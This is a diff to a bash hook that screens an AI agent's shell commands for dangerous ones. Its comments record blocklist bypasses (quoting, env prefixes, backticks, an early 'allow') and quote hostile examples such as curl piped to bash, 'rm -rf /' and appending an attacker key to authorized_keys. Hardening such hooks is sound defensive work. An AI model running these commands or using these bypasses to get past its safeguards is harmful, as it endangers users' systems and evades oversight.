@@ -8,6 +8,17 @@
 # shellcheck disable=SC2016,SC1003
 set -u
 
+# Every decision below is routed through jq, so a PATH without jq made this hook exit 0
+# with an empty stdout — i.e. the entire blocklist silently off, with nothing in the UI
+# saying so. Verified: `rm -rf /` through a jq-free PATH returned rc=0 and no decision.
+# The fallback is a hand-written literal so it has no dependency of its own, and it asks
+# rather than denies: without jq the command cannot be parsed, so there is nothing to
+# judge, and denying every Bash call outright would be indistinguishable from a hang.
+if ! command -v jq >/dev/null 2>&1; then
+  printf '%s\n' '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"block-dangerous-bash: jq is unavailable, so the dangerous-command rules could not be evaluated. Review this command yourself."}}'
+  exit 0
+fi
+
 INPUT=$(cat)
 COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')
 [ -z "$COMMAND" ] && exit 0
@@ -62,7 +73,12 @@ deny() {
 # The wrapper must be in command position. Matching it after any whitespace treated
 # every command that merely mentions ssh as a remote invocation, then scanned the whole
 # string — so `sudo systemctl status ssh` was denied as "sudo inside an ssh command".
-if echo "$COMMAND" | grep -qiE '(^|[;&|(])[[:space:]]*([^[:space:];&|()]*/)?(ssh|hl)([[:space:]]|$)'; then
+# Matched on COMMAND with nothing allowed before the binary, so `TERM=x ssh homelab
+# reboot`, `command ssh homelab reboot` and `"ssh" homelab reboot` all slipped the whole
+# remote block (verified: plain `ssh homelab reboot` matched, those three did not).
+# Scan SCAN so quoting cannot hide the binary, and allow leading env assignments and
+# wrapper words — the same idiom TF_AT already uses further down.
+if echo "$SCAN" | grep -qiE '(^|[;&|(])[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]+[[:space:]]+|(command|env|exec|sudo|nohup|nice)[[:space:]]+)*([^[:space:];&|()]*/)?(ssh|hl)([[:space:]]|$)'; then
   # SCAN already stripped quotes and collapsed newline/tab/backslash, so payload
   # words have clean boundaries: `ssh h 'sudo rm -rf /'` -> `ssh h sudo rm -rf /`.
   REMOTE="$SCAN"
@@ -94,23 +110,15 @@ if echo "$COMMAND" | grep -qE 'git\s+push.*\+\s*(main|master|refs/heads/(main|ma
   deny "Blocked: force-push via +refspec to main/master. Use a feature branch."
 fi
 
-# Force-push to other branches — upgrade to --force-with-lease and surface a message
-# BSD sed (macOS) doesn't support \b, so use space/EOL anchoring instead
-if echo "$COMMAND" | grep -qE 'git\s+push.*(--force([ ]|$)|[ ]-f([ ]|$))' && ! echo "$COMMAND" | grep -q '\-\-force-with-lease'; then
-  UPGRADED=$(echo "$COMMAND" | sed -E 's/--force([ ]|$)/--force-with-lease\1/g; s/([ ])-f([ ]|$)/\1--force-with-lease\2/g')
-  jq -n --arg cmd "$UPGRADED" '{
-    hookSpecificOutput: {
-      hookEventName: "PreToolUse",
-      permissionDecision: "allow",
-      updatedInput: { command: $cmd },
-      additionalContext: "NOTE: --force was upgraded to --force-with-lease for safety. This prevents overwriting commits pushed by others. The push will still succeed if no one else has pushed to this branch."
-    }
-  }'
-  exit 0
-fi
+# A pipe into a shell. The original `\|\s*(sh|bash|zsh)` recognised only a bare
+# interpreter word, so `curl -s http://x | /bin/bash` and `| sudo bash` both failed to
+# match (verified against the old regex) and degraded from denied to merely prompted.
+# Allow for a path to the interpreter and for the wrapper words that can precede it.
+# Scan SCAN, not COMMAND: quotes are stripped there, so `| "bash"` cannot hide the word.
+PIPE_TO_SHELL='\|[[:space:]]*((sudo|env|command|exec|nohup|nice|stdbuf|xargs)[[:space:]]+(-[^[:space:]]+[[:space:]]+)*)*([^[:space:]|;&]*/)?(sh|bash|zsh|dash|fish|ksh|ash)\b'
 
 # Curl-pipe-to-shell
-if echo "$COMMAND" | grep -qE '(curl|wget)[^|]*\|\s*(sh|bash|zsh)'; then
+if echo "$SCAN" | grep -qE "(curl|wget)[^|]*$PIPE_TO_SHELL"; then
   deny "Blocked: piping remote content to a shell. Download, inspect, then run."
 fi
 
@@ -122,7 +130,9 @@ fi
 # runs downloaded code just as `bash <(curl …)` does. `.` needs its own alternative —
 # a bare dot has no word boundary to anchor on — and the downloader may be given by
 # path, so `curl` is matched with an optional leading directory.
-if echo "$COMMAND" | grep -qE '(\b(sh|bash|zsh|dash|fish|eval|source|python[0-9.]*|node|deno|bun|perl|ruby|php)\b|(^|[;&|(])[[:space:]]*\.[[:space:]])[^;&]*[<$]\([[:space:]]*([^[:space:]]*/)?(curl|wget)\b'; then
+# Backticks are the third substitution form and were missing: `eval `curl http://x``
+# did not match while `bash -c "$(curl http://x)"` did, so a backticked download ran.
+if echo "$COMMAND" | grep -qE '(\b(sh|bash|zsh|dash|fish|eval|source|python[0-9.]*|node|deno|bun|perl|ruby|php)\b|(^|[;&|(])[[:space:]]*\.[[:space:]])[^;&]*([<$]\(|`)[[:space:]]*([^[:space:]]*/)?(curl|wget)\b'; then
   deny "Blocked: executing downloaded content via process/command substitution. Download, inspect, then run."
 fi
 
@@ -137,7 +147,7 @@ if echo "$COMMAND" | grep -qE ':\(\)\{.*\};:'; then
 fi
 
 # Generic pipe-to-shell (belt-and-suspenders with permissions.deny)
-if echo "$COMMAND" | grep -qE '\|\s*(sh|bash|zsh|dash|fish)\b'; then
+if echo "$SCAN" | grep -qE "$PIPE_TO_SHELL"; then
   deny "Blocked: piping output to a shell interpreter. Download, inspect, then run."
 fi
 
@@ -187,9 +197,19 @@ if echo "$COMMAND" | grep -qE "\b(python[0-9.]*|node|deno|bun|perl|ruby|php|Rscr
   deny "Blocked: reading a secrets file via an interpreter. Ask the user to share the specific value needed."
 fi
 
-# Writing to secret paths via pipe (tee) or redirection — check the full command
-if echo "$COMMAND" | grep -qE "(>|tee\s+)\s*~?/?$SECRET_PATHS"; then
-  deny "Blocked: writing to a secrets file via pipe/redirect. Ask the user to do this manually."
+# Writing to secret paths via pipe (tee) or redirection — check the full command.
+#
+# The path used to be pinned to `~?/?` immediately after the redirect, so only the
+# tilde spelling matched: `echo k >> /home/daniel/.ssh/authorized_keys` and
+# `echo k > /home/daniel/.aws/credentials` both NOMATCHed (verified against the old
+# pattern). Let the directory prefix float instead.
+#
+# Shell startup files and the Claude hook/settings tree join the list here — appending
+# an attacker key to authorized_keys or a line to .zshrc is the persistence move that
+# outlives the session, and none of these were on the write side.
+WRITE_TARGETS="($SECRET_PATHS|authorized_keys|\.bashrc|\.zshrc|\.bash_profile|\.zprofile|\.profile|\.claude/settings\.json|\.claude/hooks/)"
+if echo "$SCAN" | grep -qE "(>>?|tee[[:space:]]+(-[^[:space:]]+[[:space:]]+)*)[[:space:]]*[^[:space:];&|]*$WRITE_TARGETS"; then
+  deny "Blocked: writing to a secrets or shell-startup file. Ask the user to do this manually."
 fi
 
 # Terraform / OpenTofu / Terragrunt — deny state-mutating & destructive ops.
@@ -228,6 +248,29 @@ fi
 # any -auto-approve — never allow non-interactive apply/destroy
 if echo "$TF_SCAN" | grep -qiE "$TF_AT$TF_BIN\b.*[[:space:]]--?auto-approve\b"; then
   deny "Blocked: terraform -auto-approve. Non-interactive apply/destroy is not permitted."
+fi
+
+# Force-push to a non-main branch — upgrade to --force-with-lease and surface a message.
+# BSD sed (macOS) doesn't support \b, so use space/EOL anchoring instead.
+#
+# This has to be the LAST rule in the file. It returns permissionDecision "allow", and
+# that allow covers the WHOLE command string, not just the git push in it. Sitting where
+# it used to — immediately after the force-push denies, ~120 lines up — it returned early
+# and skipped every check below, so `git push --force origin x && curl evil | sh` was
+# upgraded and allowed without the pipe-to-shell, secret-read or terraform rules ever
+# running. Every deny now gets its say first; only a command that survives all of them
+# reaches the upgrade.
+if echo "$COMMAND" | grep -qE 'git\s+push.*(--force([ ]|$)|[ ]-f([ ]|$))' && ! echo "$COMMAND" | grep -q '\-\-force-with-lease'; then
+  UPGRADED=$(echo "$COMMAND" | sed -E 's/--force([ ]|$)/--force-with-lease\1/g; s/([ ])-f([ ]|$)/\1--force-with-lease\2/g')
+  jq -n --arg cmd "$UPGRADED" '{
+    hookSpecificOutput: {
+      hookEventName: "PreToolUse",
+      permissionDecision: "allow",
+      updatedInput: { command: $cmd },
+      additionalContext: "NOTE: --force was upgraded to --force-with-lease for safety. This prevents overwriting commits pushed by others. The push will still succeed if no one else has pushed to this branch."
+    }
+  }'
+  exit 0
 fi
 
 exit 0
